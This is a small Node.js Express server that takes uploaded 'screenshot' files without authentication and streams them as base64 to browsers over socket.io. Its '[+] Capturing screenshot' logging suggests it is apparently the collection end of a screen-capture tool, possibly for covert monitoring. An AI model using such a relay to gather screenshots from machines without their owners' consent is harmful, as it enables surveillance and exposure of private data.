const fileUpload = require("express-fileupload")
const socketIO = require("socket.io")
const express = require("express")
const path = require("path")

const app = express()
const server = require("http").createServer(app)
const io = new socketIO.Server(server)

app.use(fileUpload())

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"))
})

app.post("/", (req, res) => {
    const files = req.files

    if (files && files.screenshot) {
        console.log(`[+] Capturing screenshot....`)
        const data = files.screenshot.data.toString('base64')
        io.emit("data", data)
    }

    res.sendStatus(200)
})

server.listen(3000, () => {
    console.log(`Server listening on port 3000`)
})